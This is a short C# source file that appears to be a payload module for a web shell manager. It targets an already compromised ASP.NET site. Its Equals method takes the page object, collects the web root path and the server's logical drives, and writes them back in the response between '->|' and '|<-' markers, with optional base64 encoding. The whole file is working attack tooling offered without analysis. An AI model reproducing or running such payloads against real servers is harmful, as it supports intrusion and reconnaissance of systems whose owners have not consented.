using System;
using System.IO;
using System.Text;
using System.Web;
using System.Web.UI;

public class Info
{
    public HttpRequest Request;
    public HttpResponse Response;
    public String encoder;
    public String decoder;
    public String cs;
    public String randomPrefix;


    public override bool Equals(object obj)
    {
        Page page = (Page) obj;
        this.Response = page.Response;
        this.Request = page.Request;
        this.cs = "UTF-8";
        this.encoder = "base64";
        this.decoder = "";
        this.randomPrefix = "2";
        String tag_s = "->|";
        String tag_e = "|<-";
        this.Response.Charset = cs;
        String result = "";
        try
        {
            result += this.GetInfo();
        }
        catch (Exception e)
        {
            result = "ERROR:// " + e.Message;
        }

        this.Response.Write(tag_s + asoutput(result) + tag_e);
        return true;
    }

    public string GetInfo()
    {
        String ret = "";
        String[] c = Directory.GetLogicalDrives();
        ret = String.Format("{0}\t", HttpContext.Current.Server.MapPath("/"));
        for (int i = 0; i < c.Length; i++)
            ret += c[i][0] + ":";
        return ret;
    }

    public String asoutput(String src)
    {
        String ret;
        try
        {
            switch (decoder)
            {
                case "base64":
                {
                    ret = System.Convert.ToBase64String(System.Text.Encoding.GetEncoding(cs).GetBytes(src));
                    break;
                }
                default:
                {
                    ret = src;
                    break;
                }
            }
        }
        catch (Exception e)
        {
            ret = e.Message.ToString();
        }

        return ret;
    }
}